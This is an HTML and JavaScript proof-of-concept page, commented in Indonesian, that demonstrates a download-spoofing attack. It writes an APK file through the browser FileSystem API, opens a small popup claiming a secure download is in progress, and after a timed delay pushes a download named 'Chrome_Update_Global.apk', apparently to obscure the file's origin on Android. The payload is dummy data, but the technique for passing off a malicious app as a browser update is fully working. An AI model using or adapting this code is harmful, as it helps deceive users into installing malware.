<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FileSystem + Window Open PoC</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        #trigger { padding: 20px; font-size: 18px; background: #d93025; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>

    <h2>Research: Hybrid FileSystem & Window Context</h2>
    <p>Metode ini menggabungkan FileSystem API dengan jendela baru dan jeda waktu.</p>
    
    <button id="trigger">Jalankan Hybrid Attack</button>

    <div id="status" style="margin-top: 20px; color: blue;"></div>

    <script>
        document.getElementById('trigger').addEventListener('click', function() {
            const status = document.getElementById('status');
            status.innerText = "Meminta akses FileSystem...";

            // 1. Inisialisasi FileSystem
            window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;

            if (!window.requestFileSystem) {
                status.innerText = "Browser tidak mendukung FileSystem API.";
                return;
            }

            window.requestFileSystem(window.TEMPORARY, 1024 * 1024, function(fs) {
                // 2. Buat file dummy secara internal
                fs.root.getFile('security_update.apk', { create: true }, function(fileEntry) {
                    fileEntry.createWriter(function(fileWriter) {
                        const blob = new Blob(['dummy_data_poc'], { type: 'application/vnd.android.package-archive' });
                        
                        fileWriter.onwriteend = function() {
                            const fsURL = fileEntry.toURL();
                            status.innerText = "File siap. Membuka jendela baru...";

                            // 3. Buka jendela baru sebagai "Origin Bridge"
                            const win = window.open("", "_blank", "width=200,height=200");
                            
                            if (win) {
                                win.document.write("<h3>Memproses Unduhan Aman...</h3>");
                                
                                // 4. SetTimeout untuk memicu unduhan dari jendela baru
                                setTimeout(function() {
                                    const a = win.document.createElement("a");
                                    a.href = fsURL;
                                    a.download = "Chrome_Update_Global.apk";
                                    win.document.body.appendChild(a);
                                    a.click();
                                    
                                    status.innerText = "Unduhan dipicu dari jendela baru.";
                                    
                                    // Tutup kembali jendela setelah beberapa detik
                                    setTimeout(() => { win.close(); }, 3000);
                                }, 2000); // Jeda 2 detik agar UI Android sempat melakukan polling origin
                            } else {
                                status.innerText = "Pop-up terblokir.";
                            }
                        };
                        fileWriter.write(blob);
                    });
                });
            });
        });
    </script>
</body>
</html>
